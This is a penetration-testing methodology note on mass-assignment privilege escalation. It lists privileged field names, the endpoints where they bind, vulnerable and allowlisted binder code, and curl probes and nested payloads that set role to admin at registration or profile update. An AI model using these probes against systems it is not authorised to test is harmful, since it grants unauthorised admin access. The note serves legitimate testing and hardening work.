# Role assignment — a privileged field is settable at creation or update

A privileged field — `role`, `isAdmin`, `permissions`, `plan`, `tier` — is
assignable through the same endpoint that creates or updates the object.
The creation endpoint binds every field including the privileged ones.

## The mechanism

```
POST /register {"username": "x", "password": "y", "role": "admin"}
                                                     ^^^^^
                           the binder accepts it — the account is admin
```

Or the update variant:

```
POST /profile {"email": "x@x.com", "role": "admin"}
```

The binder does not distinguish "fields the user owns" from "fields the
system owns" — every key binds.

## The detection

### The privileged-field dictionary

Ordered by how often they pay:

| Field | The payoff | The shape |
|---|---|---|
| `role` | admin access | register, update |
| `isAdmin` / `is_admin` / `admin` | admin access | register, update |
| `permissions` | broad access | user, group models |
| `plan` / `tier` / `subscription` | paid features | register, billing |
| `verified` / `isVerified` / `is_verified` | skip verification | register, update |
| `balance` / `credits` / `wallet` | free credit | account models |
| `flags` | flag access | challenge models |
| `owner` / `ownerId` / `userId` | object takeover | any owned object |
| `group` / `groups` | group privilege | user models |
| `scope` / `scopes` | API privilege | API-key models |
| `is_active` / `active` | account activation | admin endpoints |
| `email_verified` | skip verification | OIDC-shaped models |
| `approved` / `moderated` | publish without review | content models |
| `internal` / `system` | internal-only object | object models |
| `__proto__` / `constructor` | prototype pollution | JS binders |

### The endpoint map

Privileged fields bind at:

- `POST /register`, `/signup`, `/users` — creation.
- `PUT/PATCH /profile`, `/account`, `/users/:id` — update.
- `POST /api/keys` — API key creation (`scope`, `permissions`).
- `POST /invite`, `/refer` — invite acceptance (`role` on join).
- `POST /admin/users` — if reachable, the admin path itself.
- Object creation generally — any model with a privileged field.

### White-box signals

```javascript
// binds everything — the privileged field included
const user = new User(req.body);
Object.assign(user, req.body);

// Go — binds every exported field
var user User
c.ShouldBindJSON(&user)

// Rails — mass-assignment without strong params
User.new(params[:user])
```

The falsifier signature — an allowlist:

```python
# Python
user = User(username=data['username'], password=data['password'])

# Rails
user_params = params.require(:user).permit(:username, :password)

# Node
const user = new User({username, password});  // explicit fields
```

## The probe

```bash
# register with the privileged field
curl -i -X POST "$BASE/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"probe1","password":"x","role":"admin"}'

# read the state back — does the object carry the privilege?
curl -i -b "$JAR" "$BASE/api/user/probe1" | jq .role

# or use the privilege — does the admin endpoint respond?
curl -i -b "$JAR" "$BASE/admin" | head -5
```

## The confirmation

The created/updated object carries the privilege — `role: "admin"` in the
read-back, or the admin endpoint responds `200` instead of `403`:

```
HTTP/1.1 200 OK
{"id": 42, "username": "probe1", "role": "admin"}
```

or:

```
HTTP/1.1 200 OK          ← GET /admin — the privileged field unlocked it
{"users": [...]}
```

## The falsifier

The field is stripped or the endpoint allowlists:

```
HTTP/1.1 200 OK
{"id": 42, "username": "probe1", "role": "user"}   ← the sent "admin" dropped
```

or:

```
HTTP/1.1 400 Bad Request
{"error": "role is not assignable"}
```

## The update variant

Registration is not the only surface — the update endpoint may bind the
same privileged fields:

```bash
# update the profile with the privileged field
curl -i -b "$JAR" -X PATCH "$BASE/profile" \
  -H "Content-Type: application/json" \
  -d '{"email":"probe@x.com","role":"admin"}'
```

The update endpoint is often less guarded than register — the register
flow is the designed surface, the update is the forgotten one.

## The nested and array deliveries

```bash
# nested — the binder may recurse
-d '{"username":"x","profile":{"role":"admin"}}'

# array-index — for Rails-style binders
-d 'user[username]=x&user[role]=admin'

# dotted path — for dot-expanding binders
-d 'username=x&profile.role=admin'
```

## The evidence rules

- The privilege must be verbatim in the read-back — `role: "admin"` in the
  object, or a `200` on the privileged endpoint.
- A `200` on the write without a state change is not a confirmation — the
  field may have been silently dropped.
- The privilege must be *used* — the admin endpoint's `200` is the impact
  evidence; the field's presence alone is the class evidence.

## The traps

- **The register flow may be hardened while the update is not.** Test both.
- **The field name is framework-shaped.** `isAdmin` vs `is_admin` vs
  `admin` — try all three.
- **The privilege may be checked at the endpoint, not the field.** A user
  with `role: admin` may still get `403` if the endpoint checks a different
  flag — find the field the endpoint actually reads.
- **Test on your own account.** Do not modify another user's role — the
  boundary is proven on your own object.
